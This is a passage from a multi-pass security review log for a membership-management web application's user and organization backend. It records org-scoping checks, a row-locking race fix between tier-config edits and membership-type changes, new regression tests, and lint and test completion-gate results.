  `membership_number_in_use` (any current row — correctly _not_
  `deleted_at`-filtered, since the unique index isn't either, matching this
  pass's own `create_member`/`update_contact_info` fix for the same
  deactivated-row collision shape) and `membership_number_reserved` (a former
  member's number, held for their return) before accepting a typed-in value.
  Both are plain counts scoped by `organization_id` — no cross-tenant
  surface.
- **The MCP roster tool's new `preferred_name` field and search clause stay
  within this tool's existing, narrower-than-`GET /users` shape.**
  `members.py`'s `_member()` now reports `full_name` (relabelled to the legal
  name explicitly, via the new `format_legal_name` helper — previously this
  field _was_ the display name under a different name, a latent naming
  mismatch with the REST API's `full_name`, not a security issue since
  nothing consumed it as an identifier), `display_name`, and `preferred_name`
  — still no contact/PII fields, matching USR-8's own reasoning for why this
  tool was left narrower than `GET /users` back in pass 6. The roster search
  clause's new `User.preferred_name.ilike(pattern, escape=LIKE_ESCAPE_CHAR)`
  arm uses the same escaped `like_pattern()` as the pre-existing
  first/last-name arms.
- **No new `.ilike()`/`.like()` without `escape=`, raw `csv.writer`, or
  `window.confirm`/`alert`/`prompt`** in any of the ten backend files
  (grepped fresh this pass — 0 hits). `BottomNavigationPreference`'s stored
  paths are validated by a bounded regex (`^/[a-z0-9][a-z0-9/-]{0,63}$`,
  `max_length` 64 implicitly) but are compared against a frontend-owned tab
  list and never rendered or used in a redirect — no injection or open-
  redirect surface even though the value round-trips through a JSON column.
- **`/users/me/email-choices`, `/users/me/bottom-navigation`, and
  `/users/welcome-email-available`** are all new GET/PUT routes under
  `/users`, which `frontend/src/utils/apiCache.ts`'s `UNCACHEABLE_PREFIXES`
  already covers with a prefix-only (no trailing slash) `/users` entry — no
  new entry needed. None return PII beyond what the existing roster/profile
  endpoints already do (email-choices reports the caller's own notification
  preferences; the other two are booleans/path lists).
- **Re-verified, not re-derived — all three open findings unchanged, current
  line numbers updated** (file growth, not regressions): **USR-5** (unbounded
  lists) — `get_archived_members` now `member_status.py:771` (was 751),
  `list_users_with_roles` now `users.py:824` (was 700), `leave_widget_summary`
  still `member_leaves.py:53`, `MemberLeaveService.list_leaves` still
  `member_leave_service.py:160`. **USR-8** (over-broad `GET /users` field
  set) — `UserService.get_users_for_organization` still `user_service.py:24`,
  `UserListResponse` now `schemas/user.py:462` (was 349 — the file grew
  `preferred_name`/`display_name` fields above this class), `list_users`
  still `users.py:102`-area (now `121`, same shift). **USR-10a**
  (`_tier_member_counts` not a locking read) — `member_status.py:1051`
  (helper, was 1031) and `:1088` (`update_membership_tier_config`, was
  1068), both outside this pass's diff region (the membership-tier config
  endpoints were not touched since pass 6). `docs/KNOWN_LIMITATIONS.md`'s
  three matching entries updated with the current line numbers (no content
  change — all three still accurate).

**0 application-code defects found, 0 fixes needed, 0 new findings.** Every
new surface this pass's real feature work introduced was reviewed against
the checklist and found already correctly guarded by the feature's own
authors — including one finding (the `email_link_domain` settings-path
isolation) that is itself a security hardening landed in this window, now
independently re-verified rather than taken on its commit message's word.

## Completion gate (pass 7)

| Check                                                                                                                                                                                                                                                                                                                                                                                                                                         | Result                                                       |
| --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------ |
| `flake8 app/ tests/ alembic/`                                                                                                                                                                                                                                                                                                                                                                                                                 | ✅ 0 violations                                              |
| `black --check app/ tests/ alembic/`                                                                                                                                                                                                                                                                                                                                                                                                          | ✅ clean (1876 files unchanged)                              |
| `isort --check-only app/ tests/ alembic/`                                                                                                                                                                                                                                                                                                                                                                                                     | ✅ clean                                                     |
| `validate_migrations.py --strict`                                                                                                                                                                                                                                                                                                                                                                                                             | ✅ 512 revisions, single head `34d3d56d1479`                 |
| `check_route_permissions.py --strict`                                                                                                                                                                                                                                                                                                                                                                                                         | ✅ 244 routes, 0 errors, 0 warnings                          |
| `pytest tests/ -k "member_status or member_leave or property_return or user_list or platoon or users or organization or rank_grant or role_edit or audit_history or ceiling or administrative or membership_tier or capacity_locking or navigation_layout or setup_checklist or mcp or preferred_name or display_name or membership_number or membership_id or bottom_nav or email_choices or email_link_domain or service_period or rejoin"` | ✅ 1,179 passed, 1 pre-existing skip (`py_vapid`), 0 failed  |
| `pytest tests/ -m "not integration and not slow and not docker"` (full unit suite — run broadly since this pass touched the shared `email_policy`/`NotificationPreferences` surface and the MCP roster tool)                                                                                                                                                                                                                                  | ✅ 12,625 passed, 1 pre-existing skip (`py_vapid`), 0 failed |
| `cd frontend && npm run typecheck`                                                                                                                                                                                                                                                                                                                                                                                                            | ✅ 0 errors                                                  |
| `cd frontend && npm run lint`                                                                                                                                                                                                                                                                                                                                                                                                                 | ✅ 0 errors, 0 warnings                                      |
| Scoped frontend suite (`Members`, `MemberAdminEditPage`, `AddMember`, `UserSettingsPage`, `MemberProfilePage`, `BottomNavigationSettings`, `BottomNavigation`, `AppLayout.navigationLayout`, `memberName` — 9 files)                                                                                                                                                                                                                          | ✅ 191 passed                                                |

---

## Pass 6 (2026-09-15)

**Scope:** full domain since pass 5's merge commit `d245a9e21` (PR #2553):
`endpoints/users.py`, `endpoints/organizations.py`, `endpoints/member_status.py`,
`endpoints/member_leaves.py`, `services/user_service.py`,
`services/organization_service.py`, `services/member_leave_service.py`,
`models/user.py`, `schemas/user.py`, `schemas/organization.py`.

**Near-zero delta since pass 5.** `git diff d245a9e21..origin/main --stat` across
all ten declared files: eight are **byte-identical** to pass 5's own reviewed
state (`users.py`, `member_leaves.py`, `services/user_service.py`,
`services/member_leave_service.py`, `models/user.py`, `schemas/user.py`,
`schemas/organization.py`, `organizations.py`), despite unrelated commits
landing on `main` since pass 5's merge. Two files changed, both from unrelated
feature work, both read in full and independently re-verified sound:

- **`member_status.py` (+25/-4, commit `9451d44bd`)** — `change_membership_type`'s
  tier-id gate previously rejected the legacy `LEGACY_MEMBERSHIP_TYPES` vocabulary
  (e.g. `"administrative"`) whenever an org had at least one tier configured, which
  made the very next line's rank-clearing enforcement (an administrative member
  must drop any operational rank, since a rank's default permissions union into
  the member's effective set) dead code for every org running the tier ladder —
  the one value that satisfies `is_administrative` was the one value the gate
  rejected. Fixed by widening the accepted set to
  `set(valid_tier_ids) | LEGACY_MEMBERSHIP_TYPES`. Re-verified from this pass's
  own angle (tenancy and locking, not the eligibility question the commit
  itself was about): the row lock ordering, `populate_existing=True`, and the
  Organization-row lock USR-10 added are all still present and unchanged at
  their documented lines (`member_status.py:836-859`); the widened `accepted`
  set only changes which values pass validation, not what is locked or how —
  no new by-id query, no new client-supplied FK, no regression on USR-10's fix.
- **`organization_service.py` (+13/-0, commit `468d4feab`)** — `email_section =
normalize_stored_platform(email_section)` added inside
  `update_organization_settings`'s email-secret-handling block, to settle a
  legacy or absent platform label before the identity-change secret-clearing
  logic judges it. Re-verified: `email_section` at this point is a key inside
  `updated_settings`, itself the return value of `_deep_merge_settings(current_settings,
settings_update)` where `current_settings = copy.deepcopy(org.settings or
{})` (`organization_service.py:409`) — the mutation lands on a fresh
  deep-merged structure, never a reference into `org.settings` itself, so
  Pitfall #12 does not apply here (there is nothing shared with SQLAlchemy's
  committed state to mutate through). No new by-id query, no new secret
  exposure — `normalize_stored_platform` only rewrites a label, and the
  existing secret-redaction/identity-change logic three lines below it is
  unchanged.

**First review of this feature's own MCP surface**
(`app/mcp/tools/members.py`, `app/mcp/tools/organization.py`), per the
precedent Elections/Documents/Apparatus/Facilities established reviewing
their own MCP surfaces in recent passes:

- `members.py`'s `list_members`/`get_member` filter
  `User.organization_id == principal.organization_id` directly (no
  parent-resolution needed — `User` carries the column itself). The response
  projection (`_member()`) carries no contact/PII fields at all — no phone,
  email, address, DOB, username, or membership number — a narrower shape than
  even `GET /users`' `UserListResponse` (USR-8's open finding), and
  `compliance_exempt` is explicitly and deliberately omitted by a code
  comment matching this feature's own USR-8 reasoning about that field's
  sensitivity. Search goes through `like_pattern()` with
  `escape=LIKE_ESCAPE_CHAR` (Pitfall #25); both the listing and the count
  query are bounded via `clamp_limit`/`clamp_offset` and SQL-level
  `.offset()/.limit()`, not an in-memory slice (Checklist §6).
- `organization.py`'s `get_department_profile` returns only name, type,
  timezone, county, website, founded year, FDID, enabled modules and an
  active-location count — no settings secrets, no email/auth configuration,
  matching the redaction discipline `organizations.py`'s own `/settings`
  route already enforces for non-`settings.manage` callers. `list_locations`/
  `get_location_description` filter `Location.organization_id ==
principal.organization_id`, are bounded/paged the same way, and run
  free-text location descriptions through `scrub_text()` before they leave
  the tool.
- **Unlike `elections.py` before ELEC-06 pass 6**, `members.py`'s tools
  already had org-scoping, PII-exclusion, wildcard-escaping and pagination
  coverage in `tests/test_mcp_tools.py` (`TestRoster`, `TestEleventhRoundFindings`)
  before this pass — confirmed by reading the tests, not inferred from their
  names: `test_list_members_is_org_scoped`, `test_list_members_never_carries_contact_details`,
  and `test_roster_filters_and_pages_in_sql`'s `search="%"` case (asserts
  `total == 0`, proving the escape is live, not merely present in the call).
  `get_department_profile` also had coverage (`test_department_profile`,
  secret-field assertions).
- **Gap found, not a leak, in `organization.py`'s location tools
  specifically:** unlike every other listing tool audited under this
  rotation's own precedent, nothing exercised `list_locations`/
  `get_location_description`'s org-scoping — `test_locations_are_paged_and_bounded`
  covers pagination, chunking and text-scrubbing for a single org, but no
  test constructs a second org's principal. The code was already correct
  (`_active_locations()` filters `organization_id` directly, same shape as
  every other tool). Added `TestThirtySecondRoundFindings::test_locations_are_org_scoped`,
  confirmed to fail against deliberately reintroduced unscoped code (removed
  the `organization_id` clause from `_active_locations`, re-ran — got
  `assert 1 == 0` — then restored and re-ran clean) before counting it as a
  guard, mirroring exactly how ELEC-06 pass 6 validated its own new test.

**Re-verified, not re-derived — all three open findings unchanged:**

- **USR-5** (LOW/MED, unbounded lists) — `get_archived_members`
  (`member_status.py:751`), `list_users_with_roles` (`users.py:700`),
  `leave_widget_summary` (`member_leaves.py:52`), and
  `MemberLeaveService.list_leaves` (`member_leave_service.py:160`) all still
  read the full table with no pagination. Line numbers checked against the
  current (post-pass-5) file state; `member_status.py`'s citation is
  unchanged from pass 5 (its 25-line diff landed above this function, not
  inside it). Still open, still mirrored in `KNOWN_LIMITATIONS.md`.
- **USR-8** (MED, over-broad `GET /users` field set) — `UserService.get_
users_for_organization` (`user_service.py:24`), `UserListResponse`
  (`schemas/user.py:349` — shifted from pass 3's original 271-298 citation by
  ordinary file growth across three intervening passes, not a regression;
  `schemas/user.py` is byte-identical to pass 5), and `list_users`
  (`users.py:102`) unchanged. Still open, still mirrored.
- **USR-10a** (LOW, `_tier_member_counts` not a locking read against
  `MembershipTierService.advance_all`) — `member_status.py:1031` (helper) and
  `:1068` (`update_membership_tier_config`), both within this pass's
  independently-re-verified `member_status.py` diff region; the
  Organization-row lock USR-10 added, and the deliberate choice not to
  extend it into a member-row lock (deadlock-avoidance argument), both
  re-read and confirmed unchanged. Still flagged, still mirrored.

**0 application-code defects found. 1 regression test added** (closing a
previously-unverified, already-correct org-scoping gap in the MCP location
tools — the same class of finding, and the same "verify the negative before
counting it" discipline, as ELEC-06 pass 6's `test_elections_are_org_scoped`).

## Completion gate (pass 6)

| Check                                                                                                                                                                                                                                                                                 | Result                                                                                                                                 |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------- |
| `flake8 app/ tests/ alembic/`                                                                                                                                                                                                                                                         | ✅ 0 violations                                                                                                                        |
| `black --check app/ tests/ alembic/`                                                                                                                                                                                                                                                  | ✅ clean (1596 files unchanged)                                                                                                        |
| `isort --check-only app/ tests/ alembic/`                                                                                                                                                                                                                                             | ✅ clean                                                                                                                               |
| `validate_migrations.py --strict`                                                                                                                                                                                                                                                     | ✅ 444 revisions, single head `6ab7d903fae5` — unchanged (no migration this pass)                                                      |
| `check_route_permissions.py --strict`                                                                                                                                                                                                                                                 | ✅ 228 routes, 0 errors, 0 warnings                                                                                                    |
| `pytest tests/ -k "member_status or member_leave or property_return or user_list or platoon or users or organization or rank_grant or role_edit or audit_history or ceiling or administrative or membership_tier or capacity_locking or navigation_layout or setup_checklist or mcp"` | ✅ 840 passed, 1 pre-existing skip (`py_vapid`), 0 failed                                                                              |
| `pytest tests/ -m "not integration and not slow and not docker"` (full unit suite — run broadly since this pass touched the shared `test_mcp_tools.py`)                                                                                                                               | ✅ 10,199 passed, 1 pre-existing skip, 0 failed (unchanged from pass 5's own count)                                                    |
| `cd frontend && npm run typecheck`                                                                                                                                                                                                                                                    | ✅ 0 errors                                                                                                                            |
| `cd frontend && npm run lint`                                                                                                                                                                                                                                                         | ✅ 0 errors, 0 warnings (no frontend file in this feature's domain changed since pass 5; run anyway per the completion-gate checklist) |

The new `test_locations_are_org_scoped` guard test was confirmed to fail
against deliberately reintroduced unscoped code (a second org's principal
seeing the first org's location; `assert 1 == 0`) before being counted as
covering the gap, and restored/re-run clean afterward.

---

## Pass 5 (2026-09-14)

**Scope:** full domain since pass 4's merge commit `83a55e014` (PR #2402):
`endpoints/users.py`, `endpoints/organizations.py`, `endpoints/member_status.py`,
`endpoints/member_leaves.py`, `services/user_service.py`,
`services/organization_service.py`, `services/member_leave_service.py`,
`models/user.py`, `schemas/user.py`, `schemas/organization.py`.

**Diff-driven, confirmed by `git diff 83a55e014..origin/main -- <file>`:**
`users.py`, `member_leaves.py`, `services/user_service.py`,
`services/organization_service.py`, `services/member_leave_service.py`, and
`models/user.py` are **byte-identical** to pass 4's own review — zero diff
across five days of unrelated commits landing elsewhere in the tree.
`organizations.py` (+136/-3) and `member_status.py` (+169/-24) changed, both
from unrelated feature work (`f14370f4a` department-wide navigation-layout
setting, `1e939465b`/`cd0fab900`/`55270e94c`/`1c0355ddf` membership-tier
config validation, `ac9990d0c` email-config fixes touching the setup
checklist's inventory-category split). `schemas/organization.py` changed
(+103/-3) for the same two features (`AppearanceSettings`,
`MembershipTierSettings`/`MembershipTierBenefits` validation).

**Read in full:** `organizations.py` (all 1,627 lines, all 21 routes — up one
from pass 4's 20) and `member_status.py` (all 1,247 lines, all 12 routes,
unchanged count) end to end, not diff-only, given this is the core
identity/tenancy surface. `schemas/organization.py`'s full diff. The new
`PATCH /settings/appearance` route and `AppearanceSettings` schema; the
`get_setup_checklist`/`update_membership_tier_config`/
`get_membership_tier_config` diffs in full, including every new helper
(`_tier_member_counts`, the duplicate-id/ordering/occupied-tier validation in
`update_membership_tier_config`).

**Re-enumerated, not re-derived:** `users.py`'s 16 by-id (`{user_id}`) routes
re-checked by the same mechanical extraction pass 4 used (parse each route
function, assert `organization_id` appears in its body) — all 16 still carry
it, consistent with the file being byte-identical. `member_leaves.py`'s 7
routes read in full: every leave lookup passes
`organization_id=str(current_user.organization_id)` into the service layer,
`get_member_leaves` still self-or-admin gates. `organizations.py`'s 21 routes
confirmed to still carry **no by-id path parameter** — every route (including
the new `/settings/appearance` and the pre-existing but previously
uncounted-by-route `/retention-policy` pair) resolves exclusively off
`current_user.organization_id`; XC-3 does not apply to this file by
construction, re-confirmed by direct read rather than inferred.
`/retention-policy`'s `record_class` path parameter is validated against a
fixed `RECORD_CLASSES` allowlist in `retention_service.py` (raises
`ValueError` → 400 for an unknown class) and its JSON-column write uses
`copy.deepcopy()` (Pitfall #12) — read in full since it shares this file's
by-id-free design and hadn't been individually named in a prior pass's route
count.

## Findings (pass 5)

### USR-10 — MED — `change_membership_type` and `update_membership_tier_config` raced each other with no lock, letting a member be assigned to a tier the other request was mid-way through deleting (or vice versa) — ✅ FIXED

**What:** `PATCH /users/{user_id}/membership-type` (`change_membership_type`)
validates the caller's chosen tier against the org's stored `membership_tiers`
ladder before writing `User.membership_type`. `PUT
/users/membership-tiers/config` (`update_membership_tier_config`) — new this
pass, replacing pass-3-and-earlier's two-field ad-hoc validation with full
`MembershipTierSettings` model validation, duplicate-id detection, and a
"cannot remove or rename a tier that members hold" occupancy check
(`_tier_member_counts`) — decides whether a tier is safe to delete by
counting who currently holds it. Neither locked the `Organization` row before
reading `settings.membership_tiers`, so two requests arriving together could
pass each other: `update_membership_tier_config` counts zero members on tier
"probationary" and removes it, while a concurrent `change_membership_type`
validates "probationary" against the ladder it read before the removal
committed and writes a member onto it — landing a row whose
`membership_type` matches no tier in the stored config. Per this pass's own
new code comments (`_tier_member_counts`'s docstring, quoting the concern
directly), that id is not something `split_membership_type` guesses at: the
member silently falls out of the operational body and the ballot electorate,
with nothing reporting it. The reverse interleaving (remove races ahead of an
in-flight assignment to the same tier) has the identical result.

**Where:** `backend/app/api/v1/endpoints/member_status.py:857-863`
(`change_membership_type`'s tier-ladder read) and `:1068-1084`
(`update_membership_tier_config`'s organization read).

**Failure scenario:** two officers holding `members.manage` — plausible in
any department where more than one person edits settings, e.g. a secretary
and a training officer both in the admin screens during a bylaws update
session — one renaming/removing a tier while the other processes a routine
membership-type change for a different member, landing on exactly this
interleaving. Neither request errors; both return success; the resulting row
is silently inconsistent.

**Impact:** MED. `members.manage`-gated on both sides (not reachable by an
ordinary member), org-scoped (not cross-tenant), and requires two
administrative actions to overlap — narrower than a capacity leak an
unauthenticated or low-privilege caller could trigger at will. Raised to MED
rather than LOW because the failure is silent (no error, no audit trail
distinguishing it from a normal successful change) and the consequence
(a member falling out of the electorate) is exactly the class of defect
CLAUDE.md Pitfall #27 and this rotation's checklist exist to catch before a
department discovers it at the next election.

**Fix:** both handlers now lock the `Organization` row (`.with_for_update()`)
before reading `settings.membership_tiers` — `change_membership_type`
already locked its target `User` row for pass 2's rank/class invariant, and
now also locks the org row after it, before validating the requested tier;
`update_membership_tier_config` locks the org row as its very first
statement, before `_tier_member_counts`. This is deliberately **not**
extended to make `_tier_member_counts` itself a locking read (see USR-10a
below, flagged rather than fixed) — analyzed and rejected: `_tier_member_counts`
would need per-member `FOR UPDATE` locks across the whole roster to be
current per Pitfall #27's "the count itself must be a locking read" half,
and `MembershipTierService.advance_all` (a separate, unattended batch job
already carrying its own carefully-tuned per-member locking from pass 2's
different race) acquires member-row locks one at a time across its own scan
without ever locking the Organization row. Locking both the Organization row
_and_ arbitrary member rows in `update_membership_tier_config` while
`advance_all` locks member rows without ever touching the Organization row
opens a textbook AB/BA deadlock: one transaction holding a member row and
waiting on the Organization row, the other holding the Organization row and
waiting on that same member row. The fix implemented here avoids that
entirely — `update_membership_tier_config` locks **only** the Organization
row, never an individual member row, so it can never be the second half of
that cycle — and closes the primary, directly-reachable race between the two
declared-scope endpoints. `change_membership_type`'s existing member-row lock
is taken _before_ its (new) Organization lock, which is safe specifically
because `update_membership_tier_config` never contends for a member row at
all; a source-inspection test asserts that invariant holds, not just that a
lock is present, so a future change that adds a member-row lock to
`update_membership_tier_config` fails loudly rather than quietly
reintroducing the cycle.

Guarded by three tests added to `tests/test_capacity_locking.py`
(`TestMembershipTierEligibility`, this codebase's established repo-wide
sweep for exactly this invariant — CLAUDE.md names it directly as enforcing
"both halves at every site"): `test_change_membership_type_locks_the_organization_row`
(asserts **two** `with_for_update()` calls, not merely one — a bare
presence check would have passed vacuously against the pre-existing User
lock from pass 2, which is a different lock protecting a different race, so
the test counts rather than merely detects), `test_update_membership_tier_config_locks_the_organization_row`,
and `test_the_organization_lock_is_taken_before_the_member_lock` (asserts the
lock ordering itself, and that `update_membership_tier_config` never takes a
member-row lock at all — the deadlock-avoidance argument above, checked by
source rather than merely asserted in a comment). The first two confirmed to
fail against the pre-fix code via `git stash` (1 lock found where 2 were
required; no lock found at all), reproducing exactly the gap this finding
describes; the ordering test does not distinguish pre-fix from post-fix code
by itself (it holds either way, since the pre-existing member-row lock was
never reordered) and is not counted as regression evidence for USR-10 on its
own — it is a structural guard against a _future_ regression, the same
non-discriminating-test caveat pass 3's own USR-7 write-up flagged for a
different test.

### USR-10a — LOW — `_tier_member_counts` is not a locking read, so `update_membership_tier_config`'s occupancy check can still miss a `MembershipTierService.advance_all` write that commits between this transaction's snapshot and its lock acquisition — ✅ FIXED 2026-10-11

> **Resolved 2026-10-11 (owner decision: option (a)).** `advance_all` locks the
> `Organization` row first and holds it for the whole scan;
> `change_membership_type` now takes the `Organization` lock before its member
> lock, so every tier writer locks in one order; and
> `update_membership_tier_config` ends its read-only transaction before taking
> the lock, so its plain occupancy count is answered from a snapshot taken
> after the lock — without that last step the lock alone does not close the
> race (the edit's snapshot predates it). `tests/test_membership_tier_lock_race.py`
> drives the scan against the edit on real connections; both tests fail with
> the snapshot step removed. The analysis below is the original flag.

**What:** the fix above closes the race between the two `member_status.py`
endpoints. It does not close every direction of Pitfall #27's "the count
itself must be a locking read" requirement against a _third_ writer:
`MembershipTierService.advance_all` (`services/membership_tier_service.py`,
not in this feature's declared scope) writes `User.membership_type` during
its unattended monthly/on-demand scan without ever locking the `Organization`
row. `update_membership_tier_config`'s occupancy count
(`_tier_member_counts`) is a plain `SELECT`, so under InnoDB's default
REPEATABLE READ it answers from the snapshot fixed at this transaction's
first read (the auth dependency's own `User` lookup, before the handler even
runs) — a snapshot that predates the Organization lock this pass added.
If an `advance_all` run commits a member onto the tier being removed in the
narrow window between that snapshot and this request's lock acquisition
(only possible when `advance_all` is not itself blocked waiting on the
Organization lock, i.e. it was never contending for it in the first place),
the occupancy check can still miss it.

**Why not fixed here:** the only complete fix is making the `advance_all`
member-row locks and `update_membership_tier_config`'s occupancy check
share one consistent lock order, which means either (a) giving `advance_all`
an Organization-row lock for its entire scan duration — a real, if bounded,
availability cost (every settings edit in the org blocks for the scan's
duration) to a file `membership_tier_service.py` that was last tuned in pass
2 for an unrelated invariant, or (b) making `_tier_member_counts` a locking
read scoped only to the tiers actually being removed, which narrows but does
not structurally eliminate the same AB/BA risk documented in USR-10's fix
(`advance_all` locks member rows one at a time across its own loop without
ever locking Organization, so a broader Organization-then-member lock order
in this file and a member-only order in that one are not consistently
nested). Either is a change to that service's own, separately-tuned locking
scheme and a deliberate availability/correctness tradeoff — architectural
discussion beyond a scoped fix, per this rotation's own escalation rule, not
a defect this pass silently walked past.

**Impact:** LOW. Requires three conditions simultaneously: an org running
the unattended tier-advancement scan, an admin editing tier config at the
same moment, and a specific narrow commit-ordering window that (unlike
USR-10) is _not_ closed merely by two requests contending for the same lock
— `advance_all` must simply never have asked for the Organization lock at
all during the relevant window. `members.manage`-gated indirectly (the scan
itself runs unattended, but its trigger and the config edit both require
that permission), org-scoped, self-healing on the next `advance_all` run in
the common case (a member whose type drifts to an unrecognized id is
`off_ladder`-counted and skipped by future scans, not silently re-corrupted
further). Mirrored into `docs/KNOWN_LIMITATIONS.md`.

## Verified good ✅ (re-confirmed pass 5)

- **`users.py` and `member_leaves.py` byte-identical to pass 4's review.**
  All 16 `users.py` by-id routes re-confirmed to filter `organization_id`
  (mechanical extraction, not sampling); privilege-ceiling call sites
  (`_enforce_role_grant_ceiling`, `_enforce_rank_grant_ceiling`,
  `_enforce_account_reset_ceiling`, `assert_positions_retain_administrator`)
  re-confirmed present at their documented lines. `member_leaves.py`'s
  create-path FK validation (XC-1, `MemberLeaveService.create_leave`) and
  `get_member_leaves`'s self-or-admin gate re-confirmed by direct read.
- **USR-9 (pass 4's HTML-escaping fix) re-confirmed byte-for-byte intact** —
  `_send_property_return_email`'s fallback loop still escapes every context
  value except `items_list_html`, still passes the `re.sub` replacement as a
  closure rather than a raw string.
- **`organizations.py`'s 21 routes (up one) still carry no by-id path
  parameter** — read every handler individually rather than inferred; the
  new `/settings/appearance` route follows the same
  `current_user.organization_id`-only pattern as every sibling `/settings/*`
  PATCH, gated on the same `settings.manage`/`organization.update_settings`
  pair, with the same secret-free response shape (navigation layout carries
  no PII, matching the route's own docstring reasoning).
- **New `get_setup_checklist` additions (medical-supplies and storefront
  catalog counts) are org-scoped** — both new `func.count()` queries filter
  `organization_id == org_id`, matching every existing counter in the same
  function; the `StoreProduct` query is wrapped in the same
  try/except-and-log pattern as its neighbors, so a missing/unmigrated table
  degrades the checklist item rather than 500ing the whole endpoint.
- **`MembershipTierSettings`/`MembershipTierBenefits`/`MembershipTier` are
  fully bounded** — `tiers` capped at `max_length=50`
  (server-enforced, not merely documented), every benefit field has an
  explicit range (`voting_min_attendance_pct` 0–100,
  `voting_attendance_period_months` 1–60), `id`/`name` have length floors and
  ceilings. `update_membership_tier_config`'s duplicate-id check, the
  sort-order/years-required monotonicity check (prevents a reordered ladder
  from silently _demoting_ a long-serving member on the next `advance_all`
  run), and the occupied-tier removal refusal were each read against their
  own reasoning comments and found to match the stated intent.
- **`EmailServiceSettings.use_tls` is no longer a dead switch** — the new
  `_derive_use_tls` model validator computes it from the same
  `resolve_smtp_settings` the actual sender consults, closing a genuine
  Pitfall #19 instance (stored, returned in the API response, read by
  nothing) rather than introducing a second, potentially-disagreeing
  authority.
- **`/retention-policy` GET/PUT (pre-existing, individually verified this
  pass)**: `record_class` validated against `RECORD_CLASSES`, no
  cross-tenant surface (org resolved via `db.get(Organization,
str(current_user.organization_id))`, no client-supplied org id anywhere),
  JSON mutation uses `copy.deepcopy()`.
- **No new `.ilike()`/`.like()`, raw `csv.writer`, or
  `window.confirm`/`alert`/`prompt`** in any of the four backend files
  (grepped fresh this pass — 0 hits).
- **USR-5 (unbounded lists) and USR-8 (over-broad `GET /users` field set)
  re-verified still open/flagged, current line numbers checked against this
  pass's file state** — `get_archived_members` now at `member_status.py:751`
  (was 738–747; the file grew from this pass's own additions, not a
  regression), `get_users_for_organization`/`UserListResponse` unchanged
  (file byte-identical to pass 4). `docs/KNOWN_LIMITATIONS.md` entries for
  both re-read and confirmed still accurate.

## Completion gate (pass 5)

| Check                                                                                                                                                                                                                                                                          | Result                                                                                                                                                     |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | ---------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `flake8` on both changed files (`member_status.py`, `tests/test_capacity_locking.py`)                                                                                                                                                                                          | ✅ 0 violations                                                                                                                                            |
| `black --check` on both changed files                                                                                                                                                                                                                                          | ✅ clean                                                                                                                                                   |
| `isort --check-only` on both changed files                                                                                                                                                                                                                                     | ✅ clean                                                                                                                                                   |
| `validate_migrations.py --strict`                                                                                                                                                                                                                                              | ✅ 444 revisions, single head — unchanged (no migration this pass)                                                                                         |
| `pytest tests/ -k "member_status or member_leave or property_return or user_list or platoon or users or organization or rank_grant or role_edit or audit_history or ceiling or administrative or membership_tier or capacity_locking or navigation_layout or setup_checklist"` | ✅ 564 passed, 1 pre-existing skip (`py_vapid`), 0 failed                                                                                                  |
| `pytest tests/` (full backend suite)                                                                                                                                                                                                                                           | ✅ 12559 passed, 21 skipped (pre-existing/environmental: Docker daemon/registry unavailable, `py_vapid` optional dep, opt-in API-contract suite), 0 failed |
| Frontend `typecheck`/`lint`                                                                                                                                                                                                                                                    | not run — no frontend file touched this pass, per CLAUDE.md's "match the verification to the change"                                                       |

The USR-10 guard tests (`test_change_membership_type_locks_the_organization_row`,
`test_update_membership_tier_config_locks_the_organization_row`) were
confirmed to fail against the pre-fix code via `git stash` (1 lock found
where 2 were required; 0 locks found where 1 was required) before being
counted as covering the finding.

---

## Pass 4 (2026-09-08)

**Scope:** full domain since pass 3's merge commit `b267ee1` (PR #2280):
`endpoints/users.py`, `endpoints/organizations.py`, `endpoints/member_status.py`,
`endpoints/member_leaves.py`, `services/user_service.py`,
`services/organization_service.py`, `services/member_leave_service.py`,
`models/user.py`, `schemas/user.py`, `schemas/organization.py`, every
migration touching these tables since, and the in-app frontend surface — a
`git diff --stat` against `frontend/src/` since `b267ee1` (191 files, mostly
unrelated scheduling/mobile-accessibility work), narrowed to every hit on
user/organization/member terms.

**Read in full (diff-driven):** the six-site `users.py` defense-in-depth diff
(`1d580ea`, org-filtering re-reads that were already safe by construction —
not a finding, a hardening pass from a different, already-closed tenancy
burn-down; re-verified each of the six sites still carries the added
`organization_id` clause and the comment explaining why it is redundant); the
new `frontend/src/pages/members/admin/settings/` module (`MembersSettingsPage`,
`MembershipIdSection`, `ContactVisibilitySection`, `membersSettingsSections.ts`,
`MembersSettingsRedirect`) and its three backing routes in `organizations.py`
(`GET`/`PATCH /settings/membership-id`, `GET /settings/membership-id/preview`)
— new since a prior pass but present, unchanged, since before pass 3's merge
point (route-count reconciliation below); `OrganizationService.
generate_next_membership_id`'s row-locking counter (CLAUDE.md Pitfall #27 —
correctly locks the parent row `with_for_update()` before the uniqueness
scan, and deep-copies the JSON settings before mutating, Pitfall #12); the
`Members.tsx`/`MembersAdminHub.tsx` `members.create`→`users.create` permission
correction (a pre-existing frontend/backend permission-string mismatch that
sent officers holding `members.manage` but not `users.create` to a button
that would 403 — fixed by a prior, non-security-review change; re-verified
against the real gate on `POST /users` rather than taken on the commit
message's word); and, reading `member_status.py`'s lines 1-281 (pass 3
explicitly left unread — see its own scope note), the full lifecycle state
machine and the property-return-email fallback path, which is where this
pass's finding is.

**Re-enumerated, not re-derived:** all 65 routes across the four files (26 +
20 + 12 + 7 — up from pass 3's stated 62/61; reconciled below, not a
regression) — every route's auth dependency and permission string checked
against the route inventory below by mechanical AST-style extraction, not
sampling. Every by-id (`{user_id}`, `{leave_id}`) fetch in all four files
re-traced for an `organization_id` filter (XC-3), and the one client-supplied
FK on a create path (`member_leaves.py`'s `create_leave_of_absence` →
`MemberLeaveService.create_leave`) re-traced for its in-org check (XC-1). All
three new `organizations.py` membership-id routes checked individually:
`PATCH` is gated `require_permission("settings.edit",
"organization.update_settings")` — verified `settings.edit` is held only by
`president`/`it_manager` (wildcard) among the 27 seeded positions (`grep`
across `DEFAULT_POSITIONS`; no other position — including `secretary`,
`treasurer`, `membership_coordinator`, `vice_president`,
`board_of_directors` — carries it), so this is not an over-broad grant
relative to its sibling `/settings/*` PATCH routes. Both `GET` routes are
bare-auth, org-scoped exclusively by `current_user.organization_id` — the
